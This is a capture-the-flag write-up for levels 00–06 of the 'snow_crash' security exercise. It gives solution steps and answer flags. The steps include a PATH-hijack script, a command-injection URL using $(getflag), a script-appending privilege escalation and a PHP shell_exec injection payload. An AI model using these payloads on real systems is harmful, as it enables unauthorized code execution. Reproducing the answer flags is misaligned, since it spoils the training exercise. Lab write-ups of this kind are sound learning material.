# 42snow_crash
## Level 00

- **Command**: `find / -user flag00 2>/dev/null`
- **File Content**: `cat /usr/sbin/john` yields `cdiiddwpgswtgt`
- **Decryption**: Caesar cipher decryption of `cdiiddwpgswtgt` gives `nottoohardhere`
- **Flag**: `x24ti5gi3x0ol2eh4esiuxias`

## Level 01

- **Encrypted Password**: `42hDRfypTqqnw`
- **Details**: Uses DES for encryption. The password for DES encryption (mode 1500 in hashcat) is `abcdefg`.
- **Flag**: `f2av5il02puano7naaf6adaaf`

## Level 02

- **Task**: Analyze a pcap file in Wireshark.
- **Password Reconstruction**: Password `ft_wandr...NDRel.L0L` with incorrect deletion attempts, corrected to `ft_waNDReL0L`.
- **Flag**: `kooda2puivaav1idi4f57q8iq`

## Level 03

- **Solution**: Create a script named "echo" that executes `getflag`.
  ```sh
  exec getflag
  ```
  Set the PATH to include the script directory.
  ```sh
  export PATH=/tmp:$PATH
  ```
- **Flag**: `qi0maab88jeaj46qoumi7maus`

## Level 04

- **Vulnerability**: Web injection.
- **Solution**: Access `http://192.168.1.31:4747/?x=$(getflag)`.
- **Flag**: `ne2searoevaevoem4ov4ar8ap`

## Level 05

- **Command**: `find / -user flag05 -type f -exec ls -lahh {} \; 2> /dev/null` to find the script
- **Task**: Locate a script executed by `flag05` and append a command to write the flag to `/tmp/out`.
  ```sh
  getflag > /tmp/out
  ```
  Monitor `/tmp/out` for the flag.
- **Flag**: `viuaaale9huek52boumoomioc`

## Level 06

- **Resources**:
  - [Understanding preg_replace filtering exploitation](https://security.stackexchange.com/questions/151142/understanding-preg-replace-filtering-exploitation)
  - [Identify and execute PHP code on a string](https://stackoverflow.com/questions/6103175/identify-and-execute-php-code-on-a-string)
- **Solution**: Use the input `[x {${shell_exec(getflag)}}]` in `/tmp/in`. The `${{}}` syntax allows for expression evaluation.
- **Execution**: `./level06 /tmp/in`
- **Flag**: `wiok45aaoguiboiki2tuin6ub`
